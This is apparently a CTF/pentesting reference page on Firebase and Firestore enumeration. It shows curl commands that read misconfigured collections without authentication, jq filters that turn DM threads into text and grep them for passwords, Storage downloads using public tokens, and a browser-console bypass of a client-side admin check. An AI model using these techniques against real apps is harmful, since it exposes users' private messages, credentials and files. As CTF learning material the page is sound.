# Firebase / Firestore Enumeration

## Table of Contents
- [Firebase / Firestore Enumeration](#firebase--firestore-enumeration)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Quick Reference](#quick-reference)
  - [Techniques](#techniques)
    - [Locating the Firebase Config](#locating-the-firebase-config)
    - [Querying Firestore Collections via REST API](#querying-firestore-collections-via-rest-api)
    - [Accessing Firebase Storage Files](#accessing-firebase-storage-files)
    - [Bypassing Client-Side Admin Controls](#bypassing-client-side-admin-controls)
  - [Files](#files)
  - [References](#references)
    - [Labs](#labs)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Firebase is a Google cloud platform commonly used by web and mobile apps for authentication, real-time databases, file storage (Cloud Storage), and Firestore (a NoSQL document database). Misconfigured Firebase projects are a common CTF and real-world vulnerability — weak security rules can expose entire collections of user data, private messages, and files without any authentication.

**Key attack surface:**
- Firestore collections with overly permissive security rules (readable without auth)
- Firebase Storage buckets left publicly accessible
- Firebase config embedded in client-side JavaScript (exposes project ID, API key, storage bucket)
- Client-side admin access controls that can be bypassed via browser console

---

## Quick Reference

| Target | URL Pattern |
|---|---|
| Firestore collection | `https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents/{COLLECTION}` |
| Firebase Storage metadata | `https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{ENCODED_PATH}` |
| Firebase Storage file download | `https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{ENCODED_PATH}?alt=media` |
| Firebase Storage file with token | `https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{ENCODED_PATH}?alt=media&token={TOKEN}` |

---

## Techniques

### Locating the Firebase Config

Firebase web apps embed their configuration in client-side JavaScript. Look for it in the page source or bundled JS assets:

```js
const firebaseConfig = {
    apiKey: "AIzaSy...",
    authDomain: "project-id.firebaseapp.com",
    projectId: "project-id",
    storageBucket: "project-id.firebasestorage.app",
    messagingSenderId: "123456789",
    appId: "1:123456789:web:abc123"
}
```

**Where to find it:**
- View page source: look for `apiKey`, `authDomain`, `projectId`
- Browser DevTools → Sources → search for `firebaseConfig` or `apiKey`
- Bundled/minified JS assets linked from the HTML `<script>` tags
- HTML comments (developers sometimes leave TODOs referencing collection names)

The `projectId` and `storageBucket` values are all you need to query Firestore and Storage directly.

### Querying Firestore Collections via REST API

If Firestore security rules are weak or missing, collections can be read without authentication using the REST API:

```bash
# List all documents in a collection
curl "https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents/{COLLECTION}" \
  > collection.json

# Parse document names
jq -r '.documents[].name' collection.json

# Count documents
jq -r '.documents[].name' collection.json | wc -l
```

**Extracting readable fields with `jq`:**
```bash
# Extract a specific string field from all documents
jq -r '.documents[] | .fields.fieldName.stringValue' collection.json

# Format DM threads as readable chat log
jq -r '.documents[] | . as $doc |
  ($doc.fields.messages.arrayValue.values |
    map(.mapValue.fields | {(.senderUid.stringValue): .senderName.stringValue}) | add) as $names |
  "=== " + ($doc.fields.participants.arrayValue.values |
    map("\($names[.stringValue]) [\(.stringValue)]") | join(", ")) + " ===",
  ($doc.fields.messages.arrayValue.values[] | .mapValue.fields |
    "[\(.timestamp.timestampValue)] \(.senderName.stringValue):\n  \(.content.stringValue)"), ""' \
  dms.json > dms-threads.txt

# Filter extracted text for keywords
grep -i "password" dms-threads.txt
grep -i "passphrase" dms-threads.txt
```

**Firestore REST API URL structure:**
```
https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/{DATABASE_ID}/documents/{COLLECTION_ID}
```
- `PROJECT_ID` — from the Firebase config `projectId` field
- `DATABASE_ID` — almost always `(default)`
- `COLLECTION_ID` — name of the Firestore collection (e.g., `users`, `messages`, `dms`)

### Accessing Firebase Storage Files

Firebase Storage files can be accessed via two URL formats:

**Raw GCS URL** (may require authentication or signed token):
```
https://storage.googleapis.com/{BUCKET}/{PATH}
```

**Firebase Storage URL** (supports download tokens, often publicly accessible):
```
https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{URL_ENCODED_PATH}
```

To get file metadata (including the `downloadTokens` field if present):
```bash
# URL-encode the path (replace / with %2F)
curl "https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{ENCODED_PATH}"
```

To download the file:
```bash
# With ?alt=media (no token needed if bucket is public)
curl "https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{ENCODED_PATH}?alt=media" \
  -o output_file.jpg

# With download token (from metadata response)
curl "https://firebasestorage.googleapis.com/v0/b/{BUCKET}/o/{ENCODED_PATH}?alt=media&token={TOKEN}" \
  -o output_file.jpg
```

**Note:** If the raw GCS URL returns `AccessDenied`, check the Firebase Storage metadata endpoint for a `downloadTokens` field — these tokens are long-lived and public, and allow downloading without authentication.

### Bypassing Client-Side Admin Controls

Firebase web apps sometimes implement admin access checks entirely in client-side JavaScript, comparing the current user's UID against a hardcoded admin UID. If the check also reads from a global `window` variable, it can be bypassed via the browser console:

**Identifying the pattern in minified JS:**
```js
// Common pattern: checks user UID OR a window variable
const isAdmin = (currentUser?.uid === ADMIN_UID) || (window.ADMIN_UID === ADMIN_UID);
```

**Exploit — set the window variable in DevTools console:**
```js
window.ADMIN_UID = "adminUidValueFromSourceCode"
```

The check typically runs on an interval (e.g., every 500ms via `setInterval`), so the UI will update automatically within seconds of setting the variable.

**How to find the admin UID:**
- Search minified JS for hardcoded UID strings (look near `window.ADMIN_UID` or `window.EXPECTED_ADMIN_UID`)
- Trigger the access-denied error message — it often leaks the expected UID in the error output

---

## Files

| File | Description |
|---|---|
| N/A | N/A |

---

## References

### Labs
| Source | Name |
|---|---|
| N/A | N/A |

### Challenges
| Source | Name |
|---|---|
| Holiday Hack Challenge 2025, Act III | [Gnome Tea](../../../ctf-writeups/holiday-hack-challenge/2025/act-iii/gnome-tea/README.md) |


### Web Sites
- [Google Firestore REST API Documentation](https://docs.cloud.google.com/firestore/docs/reference/rest/v1/projects.databases.documents/list)
- [A guide to Firebase Storage download URLs and tokens](https://www.sentinelstand.com/article/guide-to-firebase-storage-download-urls-tokens)
- [HackTricks - Firebase Enum](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-firebase-enum.html)
- [HackTricks - Firestore Enum](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-firestore-enum.html)
